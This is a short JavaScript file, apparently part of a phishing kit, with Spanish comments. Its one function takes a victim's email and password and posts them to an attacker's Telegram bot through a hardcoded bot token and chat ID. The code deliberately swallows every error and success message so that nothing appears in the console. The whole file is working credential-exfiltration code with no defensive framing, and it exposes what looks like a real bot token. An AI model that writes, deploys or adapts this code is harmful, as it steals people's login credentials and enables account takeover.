// sender.js
// Función para enviar correo y contraseña a un bot de Telegram

function enviarCredencialesTelegram(email, password) {
  const token = '8661171262:AAFERx712IcMyTvPJDId8bLvMPK00hIvJu0';
  const chatId = '1739505466';
  const mensaje = `Formulario enviado\nCorreo: ${email}\nContraseña: ${password}`;
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  fetch(url, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      chat_id: chatId,
      text: mensaje
    })
  })
  .then(() => {
    // No mostrar nada en consola
  })
  .catch(() => {
    // No mostrar nada en consola
  });
}

// Exportar la función si se usa con módulos
// export { enviarCredencialesTelegram };